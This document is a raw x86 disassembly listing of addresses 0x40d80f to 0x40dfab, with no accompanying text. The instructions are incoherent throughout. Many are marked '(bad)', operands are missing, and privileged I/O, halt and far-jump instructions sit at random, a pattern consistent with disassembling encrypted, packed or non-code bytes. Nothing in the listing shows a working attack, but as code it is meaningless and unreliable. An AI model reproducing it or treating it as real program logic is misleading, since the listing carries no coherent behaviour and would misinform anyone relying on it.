  40d80f:	xor    al,0xf
  40d811:	inc    esi
  40d812:	jecxz  0x40d7f2
  40d814:	shl    ebp,1
  40d816:	inc    ebp
  40d817:	push   esi
  40d818:	xchg   edx,eax
  40d819:	ret    
  40d81a:	gs xor eax,0x59988d3e
  40d820:	sub    DWORD PTR [edi],edx
  40d822:	jmp    0xe1d4:0x22d554df
  40d829:	neg    esi
  40d82b:	xor    al,0xe8
  40d82d:	inc    edi
  40d82e:	mov    eax,esi
  40d830:	jge    0x40d7e2
  40d832:	sbb    DWORD PTR [ebx+ebp*2-0x4c6df59c],ebx
  40d839:	cmp    DWORD PTR [edi],esp
  40d83b:	std    
  40d83c:	fistp  DWORD PTR [ebx-0x7c]
  40d83f:	lock jnp 0x40d807
  40d842:	mov    dl,0xa5
  40d844:	lock sar DWORD PTR [eax-0x78],0x47
  40d849:	call   0xf8ee:0x2e1da961
  40d850:	mov    dl,0xdf
  40d852:	pop    ebx
  40d853:	jne    0x40d7ea
  40d855:	jmp    0x7d68:0x7163cf93
  40d85c:	or     DWORD PTR [edx-0x43bfeb3f],eax
  40d862:	sub    bh,BYTE PTR [eax]
  40d864:	dec    edx
  40d865:	mov    DWORD PTR ds:0xffef6f0b,edx
  40d86b:	repz inc edi
  40d86d:	aaa    
  40d86e:	mov    cl,BYTE PTR [esi]
  40d870:	or     BYTE PTR [ecx+0x20810ce],dl
  40d876:	lahf   
  40d877:	xor    al,bh
  40d879:	xlat   BYTE PTR ds:[ebx]
  40d87a:	cdq    
  40d87b:	(bad)  
  40d87c:	xor    BYTE PTR [ecx+0x7d81c16d],ch
  40d882:	das    
  40d883:	mov    cl,0x34
  40d885:	imul   BYTE PTR [ecx]
  40d887:	fwait
  40d888:	loope  0x40d831
  40d88a:	or     al,0xaa
  40d88c:	mov    eax,ds:0x30023f34
  40d891:	push   cs
  40d892:	das    
  40d893:	jmp    FWORD PTR [ebx-0x8]
  40d896:	mov    edx,0xc1120e6c
  40d89b:	and    eax,0x13d8c2e2
  40d8a0:	dec    ecx
  40d8a1:	(bad)  [ebp+0x6e]
  40d8a4:	dec    ecx
  40d8a5:	push   ebx
  40d8a6:	packuswb mm3,QWORD PTR [edx-0x686047c3]
  40d8ad:	dec    edi
  40d8ae:	(bad)  
  40d8af:	mov    es,esp
  40d8b1:	cmp    DWORD PTR [edx-0x8ea7a4a],esi
  40d8b7:	popf   
  40d8b8:	dec    ecx
  40d8b9:	mov    al,ds:0xcc90fa01
  40d8be:	dec    ebp
  40d8bf:	in     eax,0x3b
  40d8c1:	call   DWORD PTR [edi+0x55fc17c9]
  40d8c7:	cmp    eax,0xebb987c3
  40d8cc:	add    DWORD PTR [esi-0x50cf82c7],esp
  40d8d2:	imul   edx,DWORD PTR [ebx],0x65
  40d8d5:	sbb    BYTE PTR [ebp-0x6d2c5c4b],0x15
  40d8dc:	inc    ebx
  40d8dd:	sbb    bh,ah
  40d8df:	das    
  40d8e0:	cld    
  40d8e1:	jb     0x40d933
  40d8e3:	jle    0x40d915
  40d8e5:	ins    BYTE PTR es:[edi],dx
  40d8e6:	xor    al,0xb3
  40d8e8:	jl     0x40d883
  40d8ea:	jmp    0x843a054a
  40d8ef:	stos   BYTE PTR es:[edi],al
  40d8f0:	ss in  eax,dx
  40d8f2:	cmp    al,0xbf
  40d8f4:	jns    0x40d8a9
  40d8f6:	imul   edx,DWORD PTR [esi+0x48af0831],0x14
  40d8fd:	mov    bh,0xb
  40d8ff:	push   esi
  40d900:	loop   0x40d88b
  40d902:	lods   al,BYTE PTR cs:[esi]
  40d904:	(bad)  
  40d905:	jns    0x40d895
  40d907:	jmp    0x40d950
  40d909:	aad    0x93
  40d90b:	jl     0x40d8d1
  40d90d:	pushf  
  40d90e:	mov    edi,DWORD PTR [esi]
  40d910:	inc    ebp
  40d911:	sahf   
  40d912:	adc    ch,al
  40d914:	and    DWORD PTR [ebp+0x3ae2d00b],ecx
  40d91a:	xor    esp,DWORD PTR [edi+edx*2]
  40d91d:	out    0xc0,eax
  40d91f:	sbb    DWORD PTR [ecx-0x2db1f7b5],ebx
  40d925:	xchg   edx,eax
  40d926:	cmp    DWORD PTR [esp+edx*2-0x6a340cb3],ebx
  40d92d:	call   edi
  40d92f:	add    edi,DWORD PTR es:[ebp-0x6c8190f7]
  40d936:	xor    DWORD PTR [ebx],esi
  40d938:	mov    WORD PTR [ecx-0x6ea932a2],cs
  40d93e:	mul    ch
  40d940:	inc    DWORD PTR [ebp-0x4ab551d]
  40d946:	push   ds
  40d947:	xor    eax,0x8019bb3c
  40d94c:	mov    dh,0xe5
  40d94e:	sub    DWORD PTR [eax],eax
  40d950:	add    DWORD PTR [ebp+0x484a9f27],0xe5dce3a1
  40d95a:	aam    0xfd
  40d95c:	sub    ch,al
  40d95e:	ret    
  40d95f:	inc    ebx
  40d960:	cwde   
  40d961:	push   ss
  40d962:	sub    DWORD PTR [ebp-0x2],ebx
  40d965:	adc    al,0x22
  40d967:	repnz pushf 
  40d969:	adc    cl,BYTE PTR [esi]
  40d96b:	retf   0xf3e1
  40d96e:	fsubp  st(7),st
  40d970:	push   edx
  40d971:	sub    eax,0x2e1096be
  40d976:	and    ebx,ecx
  40d978:	call   0x642b:0xb507c1cc
  40d97f:	xchg   edx,eax
  40d980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d981:	jae    0x40d962
  40d983:	cs jo  0x40d9f2
  40d986:	out    dx,al
  40d987:	mov    es,WORD PTR [esi+0x71850942]
  40d98d:	dec    eax
  40d98e:	mov    WORD PTR [ebx+0x28],?
  40d991:	repnz sar BYTE PTR [eax],cl
  40d994:	xchg   edx,eax
  40d995:	sbb    al,0x1d
  40d997:	daa    
  40d998:	cmove  edx,DWORD PTR [esi]
  40d99b:	mov    BYTE PTR [ebp+0x70],0xaf
  40d99f:	fnstenv [ebp*2+0x2c81182c]
  40d9a6:	jb     0x40d941
  40d9a8:	lods   al,BYTE PTR ds:[esi]
  40d9a9:	pop    esi
  40d9aa:	ret    
  40d9ab:	add    edi,DWORD PTR [ecx]
  40d9ad:	add    BYTE PTR [edi+0x2c],dl
  40d9b0:	add    al,0x97
  40d9b2:	push   ebp
  40d9b3:	or     bl,0x62
  40d9b6:	ret    0x4d23
  40d9b9:	mov    ecx,0xc045e057
  40d9be:	iret   
  40d9bf:	test   BYTE PTR [ebp+0xa3928ab],al
  40d9c5:	js     0x40d9b5
  40d9c7:	pop    edx
  40d9c8:	and    ebx,edi
  40d9ca:	ja     0x40d988
  40d9cc:	js     0x40d9d5
  40d9ce:	shufps xmm4,XMMWORD PTR [esi-0xe07544d],0x9a
  40d9d6:	xchg   ebp,eax
  40d9d7:	aas    
  40d9d8:	sbb    BYTE PTR [esi+0x43],ah
  40d9db:	jns    0x40da29
  40d9dd:	and    al,BYTE PTR [esi-0xe]
  40d9e0:	in     al,0x83
  40d9e2:	call   0xb5513fc
  40d9e7:	add    DWORD PTR [esp+eiz*4-0x4],esp
  40d9eb:	call   0xedf4:0x1ecc40ef
  40d9f2:	xor    ecx,DWORD PTR [ebp+ebx*4+0x1c]
  40d9f6:	mov    esi,0x4f200c45
  40d9fb:	mov    esi,esi
  40d9fd:	xor    BYTE PTR [eax-0x70],al
  40da00:	mov    esi,0x358184c8
  40da05:	jl     0x40d999
  40da07:	cmp    al,0x44
  40da09:	sub    DWORD PTR [esi],0x28987cb0
  40da0f:	mov    edx,0x6a344a31
  40da14:	sub    BYTE PTR [ebp-0x118a3997],dh
  40da1a:	xchg   edi,eax
  40da1b:	cmp    eax,DWORD PTR [edx]
  40da1d:	rcr    bl,0x87
  40da20:	popf   
  40da21:	sar    esp,0x19
  40da24:	jo     0x40da38
  40da26:	push   edi
  40da27:	hlt    
  40da28:	ror    BYTE PTR [ebx-0x64],1
  40da2b:	add    DWORD PTR [edx],0x9fa9a261
  40da31:	daa    
  40da32:	adc    DWORD PTR [ecx+0x5c1b63f2],edi
  40da38:	nop
  40da39:	xlat   BYTE PTR ds:[ebx]
  40da3a:	xor    eax,0xa562bf5b
  40da3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da40:	or     eax,0xdaf4d6f5
  40da45:	mov    ah,0x73
  40da47:	mov    al,ds:0xd2480bd1
  40da4c:	sbb    BYTE PTR [edi],bh
  40da4e:	mov    ebx,fs
  40da50:	adc    eax,0x5e088f65
  40da55:	push   ebp
  40da56:	or     DWORD PTR [edi+0x365a729d],0x105e473e
  40da60:	xchg   ebp,eax
  40da61:	and    BYTE PTR [edi],al
  40da63:	aas    
  40da64:	mul    BYTE PTR [esi+0x78b8e0a]
  40da6a:	jb     0x40da19
  40da6c:	push   cs
  40da6d:	out    0x8e,al
  40da6f:	lods   eax,DWORD PTR ds:[esi]
  40da70:	sub    DWORD PTR [esi+0x4b],ebx
  40da73:	mov    ebp,0x5c8f38e4
  40da78:	in     al,0xdf
  40da7a:	add    edx,eax
  40da7c:	add    dh,BYTE PTR [esp+ebp*2]
  40da7f:	fwait
  40da80:	sar    BYTE PTR [ebx+0x6e],0x18
  40da84:	cmp    edx,DWORD PTR [ecx-0x605b44a9]
  40da8a:	or     cl,BYTE PTR [edi]
  40da8c:	loopne 0x40da2e
  40da8e:	dec    edi
  40da8f:	dec    ecx
  40da90:	addr16 adc al,0x75
  40da93:	inc    ecx
  40da94:	ins    DWORD PTR es:[edi],dx
  40da95:	ins    DWORD PTR es:[edi],dx
  40da96:	ja     0x40da76
  40da98:	and    ecx,DWORD PTR [eax-0x54d6ba16]
  40da9e:	cmp    BYTE PTR [edx],bh
  40daa0:	(bad)
  40daa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daa5:	mov    ebp,0xec54cdb3
  40daaa:	mov    edx,DWORD PTR [eax+ebx*1]
  40daad:	dec    esi
  40daae:	inc    eax
  40daaf:	push   0xdce375b6
  40dab4:	stos   BYTE PTR es:[edi],al
  40dab5:	aad    0x8e
  40dab7:	fmul   st(5),st
  40dab9:	(bad)  
  40daba:	out    dx,al
  40dabb:	outs   dx,DWORD PTR ds:[esi]
  40dabc:	or     ecx,DWORD PTR [edx+0x1f]
  40dabf:	and    ebp,DWORD PTR [ecx]
  40dac1:	pop    edx
  40dac2:	shl    BYTE PTR [edi+ebp*2],1
  40dac5:	inc    ebp
  40dac6:	data16 jecxz 0x40db15
  40dac9:	lahf   
  40daca:	scas   eax,DWORD PTR es:[edi]
  40dacb:	daa    
  40dacc:	popf   
  40dacd:	call   0xdbdbdbba
  40dad2:	mov    ecx,0xe4eb39ac
  40dad7:	sbb    ebp,edi
  40dad9:	daa    
  40dada:	jae    0x40dab1
  40dadc:	fiadd  DWORD PTR [esi+0x49]
  40dadf:	pop    ecx
  40dae0:	test   DWORD PTR [esi-0x6102196c],edi
  40dae6:	push   ebx
  40dae7:	push   ebx
  40dae8:	adc    eax,0x5b089e07
  40daed:	in     eax,dx
  40daee:	mov    esi,0x917fe55d
  40daf3:	cdq    
  40daf4:	jg     0x40da81
  40daf6:	xchg   ebp,eax
  40daf7:	adc    BYTE PTR [edx+0x28849127],bh
  40dafd:	cmp    eax,0x75317f12
  40db02:	ss popw es
  40db05:	adc    al,0xc2
  40db07:	fmul   QWORD PTR [eax-0x35f7cfb]
  40db0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db0e:	xor    ch,BYTE PTR gs:[esi-0x48]
  40db12:	hlt    
  40db13:	loopne 0x40db6e
  40db15:	in     eax,dx
  40db16:	lds    esi,FWORD PTR [eax]
  40db18:	mov    ds,WORD PTR [ecx]
  40db1a:	xlat   BYTE PTR ds:[ebx]
  40db1b:	dec    al
  40db1d:	out    0xeb,al
  40db1f:	pop    ebx
  40db20:	mov    al,bh
  40db22:	adc    bl,BYTE PTR [esi]
  40db24:	push   cs
  40db25:	xchg   DWORD PTR [edi+edi*8-0x5e412692],ecx
  40db2c:	jl     0x40dae2
  40db2e:	std    
  40db2f:	sbb    BYTE PTR [edx-0x728ae51a],0x7c
  40db36:	push   edx
  40db37:	inc    esi
  40db38:	stos   DWORD PTR es:[edi],eax
  40db39:	xchg   BYTE PTR [edi-0x31dc49ef],dh
  40db3f:	mov    ebx,0x2ad882d8
  40db44:	and    eax,0xd85cded7
  40db49:	add    edi,DWORD PTR [esi-0x17b45607]
  40db4f:	xchg   ecx,eax
  40db50:	loope  0x40daec
  40db52:	cmp    ecx,DWORD PTR [edi+0x57]
  40db55:	iret   
  40db56:	jle    0x40db0b
  40db58:	dec    esi
  40db59:	js     0x40db05
  40db5b:	add    al,0x8e
  40db5d:	push   ebx
  40db5e:	popf   
  40db5f:	lods   eax,DWORD PTR ds:[esi]
  40db60:	cmp    edi,DWORD PTR [ecx-0x329b1914]
  40db66:	push   edx
  40db67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db68:	scas   eax,DWORD PTR es:[edi]
  40db69:	xor    esi,eax
  40db6b:	neg    BYTE PTR [ebx+0x50]
  40db6e:	aaa    
  40db6f:	repnz leave 
  40db71:	mov    ah,0x99
  40db73:	mov    ch,0xe3
  40db75:	int    0x40
  40db77:	jb     0x40db7c
  40db79:	mov    ds:0x49f57c67,eax
  40db7e:	push   ds
  40db7f:	js     0x40db87
  40db81:	sub    ah,cl
  40db83:	jnp    0x40dbf3
  40db85:	xchg   esi,edx
  40db87:	int    0xf5
  40db89:	imul   ebp,DWORD PTR [ecx],0x46
  40db8c:	sub    ebp,DWORD PTR [edi+0x41]
  40db8f:	and    al,0xed
  40db91:	sbb    al,0xef
  40db93:	loopne 0x40dbff
  40db95:	cld    
  40db96:	dec    esi
  40db97:	(bad)
  40db9a:	gs dec edi
  40db9c:	aaa    
  40db9d:	mov    bl,0xb2
  40db9f:	xchg   edx,eax
  40dba0:	cs jmp 0x107d0e5e
  40dba6:	mov    esp,0x574ea06a
  40dbab:	and    eax,0xca71288b
  40dbb0:	out    0x3b,al
  40dbb2:	ret    0xf8b5
  40dbb5:	sbb    al,0x98
  40dbb7:	dec    eax
  40dbb8:	mov    WORD PTR [esi-0x6b],ds
  40dbbb:	jl     0x40dbe6
  40dbbd:	int3   
  40dbbe:	push   ebx
  40dbbf:	xor    dh,BYTE PTR [edi]
  40dbc1:	outs   dx,BYTE PTR ds:[esi]
  40dbc2:	jle    0x40dc28
  40dbc4:	aam    0xcb
  40dbc6:	mul    DWORD PTR [eax-0xd]
  40dbc9:	rcl    DWORD PTR [esi+edx*4-0x24],cl
  40dbcd:	or     DWORD PTR [edi+0x44],0xffffffb7
  40dbd1:	or     eax,0x873863a5
  40dbd6:	pop    edx
  40dbd7:	add    DWORD PTR [ebx*1+0x2a055a1],0x3caf243e
  40dbe2:	les    ebp,FWORD PTR [edx+0x37bcb82d]
  40dbe8:	int3   
  40dbe9:	arpl   WORD PTR [edx+0x4c],bx
  40dbec:	xor    dl,al
  40dbee:	cmp    BYTE PTR [edi],dh
  40dbf0:	popf   
  40dbf1:	jmp    FWORD PTR ds:0xd78d0c4c
  40dbf7:	adc    eax,0xf7371b09
  40dbfc:	shl    DWORD PTR [ebx+0x6c],cl
  40dbff:	sub    BYTE PTR fs:[ebx],dl
  40dc02:	mov    ch,0x7e
  40dc04:	push   ss
  40dc05:	fs cwde 
  40dc07:	xor    ebx,DWORD PTR ds:0xa7a7ffaa
  40dc0d:	xchg   BYTE PTR [edi-0x62fca972],ah
  40dc13:	pop    es
  40dc14:	adc    al,0x6
  40dc16:	fld    DWORD PTR [ebx-0x41]
  40dc19:	push   ebx
  40dc1a:	jecxz  0x40dbb0
  40dc1c:	ins    BYTE PTR es:[edi],dx
  40dc1d:	xchg   edi,eax
  40dc1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc1f:	mov    dh,0x49
  40dc21:	or     eax,0xb51f8562
  40dc26:	sahf   
  40dc27:	or     edi,DWORD PTR [esi]
  40dc29:	mov    dl,0xaa
  40dc2b:	popf   
  40dc2c:	mov    cl,0xb0
  40dc2e:	push   eax
  40dc2f:	pop    edi
  40dc30:	ins    WORD PTR es:[di],dx
  40dc33:	xchg   esp,eax
  40dc35:	sbb    DWORD PTR [ebp+0x69],ebp
  40dc38:	inc    eax
  40dc39:	loop   0x40dbf3
  40dc3b:	mov    eax,0x7e453324
  40dc40:	push   cs
  40dc41:	xchg   edx,eax
  40dc42:	adc    ch,bh
  40dc44:	ss mov eax,0x637f129f
  40dc4a:	call   0x9292e597
  40dc4f:	test   eax,0x72d376ce
  40dc54:	lds    esp,FWORD PTR [eax+0x44690b86]
  40dc5a:	jge    0x40dc91
  40dc5c:	stc    
  40dc5d:	sbb    DWORD PTR [esi+ebx*8-0x4b14c0dc],ebx
  40dc64:	data16 int 0x74
  40dc67:	daa    
  40dc68:	mov    ecx,0xf23e4283
  40dc6d:	push   esp
  40dc6e:	cmc    
  40dc6f:	ins    BYTE PTR es:[edi],dx
  40dc70:	in     eax,0x7f
  40dc72:	(bad)  
  40dc73:	jmp    0x40dc5d
  40dc75:	push   eax
  40dc76:	cwde   
  40dc77:	inc    ebp
  40dc78:	loope  0x40dcd7
  40dc7a:	call   0x8bd9e0fe
  40dc7f:	iret   
  40dc80:	mov    bh,BYTE PTR [esp+eax*2+0x77]
  40dc84:	sub    edi,eax
  40dc86:	jl     0x40dd00
  40dc88:	int3   
  40dc89:	jnp    0x40dd06
  40dc8b:	and    DWORD PTR cs:[esp+esi*4],0x383c25a6
  40dc93:	add    cl,BYTE PTR [esi+0x6c]
  40dc96:	fimul  DWORD PTR [ecx+0x37]
  40dc99:	xor    ecx,0x503d148a
  40dc9f:	mov    ecx,0x58a00628
  40dca4:	scas   al,BYTE PTR es:[edi]
  40dca5:	fs and eax,0x1a2559be
  40dcab:	(bad)  
  40dcac:	mov    esp,0x738b24ef
  40dcb1:	dec    esp
  40dcb2:	aaa    
  40dcb3:	call   0xcd6dccf
  40dcb8:	push   ds
  40dcb9:	not    DWORD PTR [ebx-0x47]
  40dcbc:	test   DWORD PTR [eax+0x4d],0x90025fe2
  40dcc3:	pop    es
  40dcc4:	jb     0x40dc79
  40dcc6:	push   ecx
  40dcc7:	mov    dl,0x92
  40dcc9:	xchg   BYTE PTR ds:0xb61e936,cl
  40dccf:	sbb    DWORD PTR [esp+edx*8-0x94e0292],esp
  40dcd6:	jle    0x40dc76
  40dcd8:	retf   0x535b
  40dcdb:	and    ebx,ebp
  40dcdd:	retf   0xdeaf
  40dce0:	adc    eax,0x8abd4cd1
  40dce5:	in     al,dx
  40dce6:	mov    dl,0xe
  40dce8:	and    DWORD PTR [ebp+0x32],0x12
  40dcec:	xor    BYTE PTR [esi+edi*4],dh
  40dcef:	lods   al,BYTE PTR ds:[esi]
  40dcf0:	sbb    DWORD PTR [ecx-0x1d],ebp
  40dcf3:	adc    BYTE PTR [ebx+0x11f114a7],0x4f
  40dcfa:	mov    al,ds:0x62a21f07
  40dcff:	xlat   BYTE PTR ds:[ebx]
  40dd00:	xor    al,0xd2
  40dd02:	mov    ds:0x15a99406,eax
  40dd07:	imul   edx
  40dd09:	push   ecx
  40dd0a:	inc    ecx
  40dd0b:	aas    
  40dd0c:	mov    ah,0xec
  40dd0e:	je     0x40dcbe
  40dd10:	call   0x85ea:0x7ddbebe0
  40dd17:	cmp    DWORD PTR [edi],esi
  40dd19:	jae    0x40dcc2
  40dd1b:	xor    dl,BYTE PTR [ebp+0x2688693e]
  40dd21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd22:	popf   
  40dd23:	das    
  40dd24:	jmp    0xb148b85e
  40dd29:	mov    edx,0xdaf2b5da
  40dd2e:	out    0xf4,eax
  40dd30:	in     eax,dx
  40dd31:	shr    DWORD PTR [edx],1
  40dd33:	or     dl,BYTE PTR [ebp+eiz*4+0x6e]
  40dd37:	(bad)  
  40dd38:	pop    ebx
  40dd39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd3a:	cld    
  40dd3b:	loope  0x40dd0f
  40dd3d:	dec    esp
  40dd3e:	hlt    
  40dd3f:	dec    ebp
  40dd40:	test   eax,0xdd15d644
  40dd45:	nop
  40dd46:	adc    eax,DWORD PTR [edi+0x7]
  40dd49:	add    eax,0x2f48cb4b
  40dd4e:	push   cs
  40dd4f:	dec    esp
  40dd50:	xchg   esp,eax
  40dd51:	jecxz  0x40ddae
  40dd53:	(bad)  
  40dd54:	stos   DWORD PTR es:[edi],eax
  40dd55:	sar    esi,1
  40dd57:	hlt    
  40dd58:	sbb    esp,DWORD PTR [esi]
  40dd5a:	and    eax,0xf9e81628
  40dd5f:	imul   edi,DWORD PTR [edx+0x4e],0xffffff8a
  40dd63:	aad    0x5c
  40dd65:	inc    esp
  40dd66:	mov    ah,0xdd
  40dd68:	test   eax,0xb599e896
  40dd6d:	cld    
  40dd6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd6f:	mov    ch,0x8d
  40dd71:	out    dx,al
  40dd72:	mov    bh,0x1e
  40dd74:	mov    esi,0x2b9bd3b9
  40dd79:	jns    0x40dd48
  40dd7b:	pop    ebp
  40dd7c:	and    al,BYTE PTR [edx]
  40dd7e:	int3   
  40dd7f:	mov    ah,0x33
  40dd81:	dec    edi
  40dd82:	sti    
  40dd83:	cli    
  40dd84:	push   eax
  40dd85:	jge    0x40dd74
  40dd87:	jbe    0x40ddc7
  40dd89:	mov    ah,0x0
  40dd8b:	cmp    ebx,ecx
  40dd8d:	xchg   ebp,eax
  40dd8e:	mov    dl,BYTE PTR [edi-0x5b1632f2]
  40dd94:	push   ds
  40dd95:	and    bh,ah
  40dd97:	das    
  40dd98:	cli    
  40dd99:	xchg   ebx,eax
  40dd9a:	and    al,0x6c
  40dd9c:	(bad)  
  40dd9d:	cwde   
  40dd9e:	(bad)  
  40dd9f:	ror    BYTE PTR [edi+0x7929eb],1
  40dda5:	dec    BYTE PTR [edx-0x5fd02fd7]
  40ddab:	es push esi
  40ddad:	mov    dh,0xdb
  40ddaf:	not    DWORD PTR [ebp+0x111f1f5]
  40ddb5:	out    dx,al
  40ddb6:	iret   
  40ddb7:	fidivr DWORD PTR [ecx]
  40ddb9:	cmp    ebx,DWORD PTR [edi]
  40ddbb:	add    esi,DWORD PTR [ebp-0xc6c1071]
  40ddc1:	lods   eax,DWORD PTR ds:[esi]
  40ddc2:	xor    eax,0xe95b593d
  40ddc7:	dec    eax
  40ddc8:	mov    esi,0xfec3a5cc
  40ddcd:	xlat   BYTE PTR cs:[ebx]
  40ddcf:	aaa    
  40ddd0:	cli    
  40ddd1:	push   eax
  40ddd2:	ret    0x9edb
  40ddd5:	int3   
  40ddd6:	and    eax,0xf6f3f940
  40dddb:	and    bh,BYTE PTR [esi-0x47]
  40ddde:	add    bh,BYTE PTR [ebp+ecx*1+0x57]
  40dde2:	(bad)  
  40dde3:	shl    DWORD PTR [ecx+0x351c5a69],1
  40dde9:	mov    DWORD PTR [eax-0x12b21a9a],eax
  40ddef:	dec    ebp
  40ddf0:	mov    BYTE PTR [ebp-0x11],bl
  40ddf3:	lock (bad) 
  40ddf5:	mov    edx,0x6dadcbf0
  40ddfa:	fstp   DWORD PTR [edx+edi*2+0x60]
  40ddfe:	mov    esp,0xc0a1a37d
  40de03:	pop    eax
  40de04:	mov    edi,0xe316a1fe
  40de09:	push   eax
  40de0a:	sti    
  40de0b:	enter  0xd3de,0x9f
  40de0f:	fmul   st,st(0)
  40de11:	icebp  
  40de12:	inc    esp
  40de13:	and    BYTE PTR [esi-0xd21b560],bh
  40de19:	push   es
  40de1a:	mov    WORD PTR [edx-0x6966ccf6],ds
  40de20:	test   DWORD PTR [edx+0x9],eax
  40de23:	ret    
  40de24:	out    0x27,eax
  40de26:	cmp    BYTE PTR [eax],dh
  40de28:	jg     0x40ddc5
  40de2a:	jmp    DWORD PTR [eax-0x18]
  40de2d:	test   esp,esi
  40de2f:	gs aas 
  40de31:	sbb    dl,bh
  40de33:	mov    dh,0xc0
  40de35:	or     ecx,DWORD PTR [eax-0x32]
  40de38:	dec    ebp
  40de39:	mov    al,0xbc
  40de3b:	dec    ecx
  40de3c:	daa    
  40de3d:	lods   al,BYTE PTR ds:[esi]
  40de3e:	mov    ?,WORD PTR [ecx+0x1f5292af]
  40de44:	cdq    
  40de45:	aaa    
  40de46:	sahf   
  40de47:	xor    sp,WORD PTR [ebp+0x13]
  40de4b:	ror    DWORD PTR [eax],cl
  40de4d:	scas   eax,DWORD PTR es:[edi]
  40de4e:	dec    BYTE PTR [ebx]
  40de50:	in     eax,dx
  40de51:	sub    eax,0xfb7f054e
  40de56:	mov    ebp,0x1efe101e
  40de5b:	sbb    esp,DWORD PTR [ecx-0x74]
  40de5e:	xor    ch,BYTE PTR [ebx]
  40de60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de61:	sub    al,0x4b
  40de63:	std    
  40de64:	enter  0xf0e2,0xd
  40de68:	inc    esp
  40de69:	and    DWORD PTR ds:0x6803c3f2,edi
  40de6f:	mov    ch,0xd0
  40de71:	fwait
  40de72:	sub    BYTE PTR [esp+esi*1+0x37dc1ded],ah
  40de79:	jmp    0x9faf823a
  40de7e:	pop    ebp
  40de7f:	jb     0x40de32
  40de81:	cmp    BYTE PTR [edi+0x78],al
  40de84:	pop    edx
  40de85:	pop    ebx
  40de86:	ret    0x5050
  40de89:	xlat   BYTE PTR ds:[ebx]
  40de8a:	and    ch,BYTE PTR cs:0x56dc021a
  40de91:	das    
  40de92:	jns    0x40dedb
  40de94:	mov    ecx,0x59b1f0c8
  40de99:	lock push edx
  40de9b:	pop    esi
  40de9c:	into   
  40de9d:	cmp    DWORD PTR [ebx],eax
  40de9f:	mov    edi,0x7051a368
  40dea4:	jmp    0x205b4c38
  40dea9:	xor    esp,DWORD PTR [edx]
  40deab:	push   esi
  40deac:	cmp    ch,dl
  40deae:	lods   al,BYTE PTR ds:[esi]
  40deaf:	mov    al,0x36
  40deb1:	dec    eax
  40deb2:	xor    DWORD PTR [eax],ebp
  40deb4:	(bad)  
  40deb5:	aad    0x89
  40deb7:	fwait
  40deb8:	or     DWORD PTR [ecx+ebx*4-0x66cd4d8a],esi
  40debf:	mov    ebp,DWORD PTR [ecx+0x5e]
  40dec2:	fistp  WORD PTR [eax*2+0x56e6f65b]
  40dec9:	lock xor eax,0x9f221fa2
  40decf:	or     ch,cl
  40ded1:	xor    bl,BYTE PTR [edx]
  40ded3:	out    0xdc,eax
  40ded5:	dec    esi
  40ded6:	cmp    bl,cl
  40ded8:	imul   ebx,DWORD PTR [edx+0x5f24d469],0xdee1d22d
  40dee2:	cmp    DWORD PTR [esi],ebx
  40dee4:	neg    BYTE PTR [eax+0x5a]
  40dee7:	aas    
  40dee8:	pop    ebp
  40dee9:	pusha  
  40deea:	fs cs inc ecx
  40deed:	jmp    0x40de82
  40deef:	test   BYTE PTR [ebp-0x5016a4ed],ch
  40def5:	sub    DWORD PTR ds:0x593f2d7a,ecx
  40defb:	jecxz  0x40df36
  40defd:	aas    
  40defe:	imul   edi,DWORD PTR [eax+0x2],0x53951e1c
  40df05:	pop    ebp
  40df06:	jl     0x40df01
  40df08:	adc    eax,0x663dc2c2
  40df0d:	sub    dl,ah
  40df0f:	pop    ds
  40df10:	and    DWORD PTR [edx-0x65a71ad6],ebp
  40df16:	dec    ebp
  40df17:	inc    eax
  40df18:	inc    edi
  40df19:	mov    ebx,DWORD PTR [edx+edi*4]
  40df1c:	mov    al,dl
  40df1e:	inc    esp
  40df1f:	sub    BYTE PTR [ebp+edi*1-0x8],0x99
  40df24:	xlat   BYTE PTR ds:[ebx]
  40df25:	inc    esp
  40df26:	stc    
  40df27:	or     DWORD PTR [edx-0x70],eax
  40df2a:	or     al,0x9e
  40df2c:	xor    esp,DWORD PTR [ebx+0xc33affe]
  40df32:	mov    eax,ds:0x60045a65
  40df37:	mov    al,ds:0x1aa04403
  40df3c:	inc    esp
  40df3d:	xor    ch,cl
  40df3f:	and    DWORD PTR [eax],edx
  40df41:	retf   0x1948
  40df44:	in     eax,0x38
  40df46:	outs   dx,BYTE PTR ds:[esi]
  40df47:	arpl   si,di
  40df49:	or     eax,0xd069aea9
  40df4e:	adc    DWORD PTR [eax+0x55],0x51b5be9f
  40df55:	inc    ecx
  40df56:	xchg   esi,eax
  40df57:	fs mov ?,edx
  40df5a:	or     esi,edx
  40df5c:	inc    ebp
  40df5d:	or     al,0x90
  40df5f:	or     DWORD PTR [ebx-0x63d5a02c],edi
  40df65:	in     eax,0x45
  40df67:	iret   
  40df68:	sbb    eax,0x95a40be8
  40df6d:	mov    cl,0x70
  40df6f:	loope  0x40dfd0
  40df71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df72:	fldenv [edx]
  40df74:	in     eax,dx
  40df75:	mov    al,ds:0xa82dd60c
  40df7a:	xchg   esi,eax
  40df7b:	pop    ds
  40df7c:	mov    dh,0xdb
  40df7e:	pusha  
  40df7f:	xchg   esp,eax
  40df80:	or     bl,0x9e
  40df83:	sbb    eax,0x2f3d57fe
  40df88:	lds    esi,FWORD PTR [ecx+0x34]
  40df8b:	je     0x40dfb6
  40df8d:	(bad)  
  40df8f:	push   esp
  40df90:	mov    ds:0x51d621cb,eax
  40df95:	popf   
  40df96:	xchg   esi,eax
  40df97:	xchg   BYTE PTR [edi],bh
  40df99:	sub    DWORD PTR [edi-0x54],ecx
  40df9c:	sub    BYTE PTR [ebx+0x1f],dh
  40df9f:	iret   
  40dfa0:	in     al,0x1b
  40dfa2:	std    
  40dfa3:	aaa    
  40dfa4:	adc    al,0x8c
  40dfa6:	mov    dl,0xb9
  40dfa8:	repz cmp ebx,esp
  40dfab:	daa    
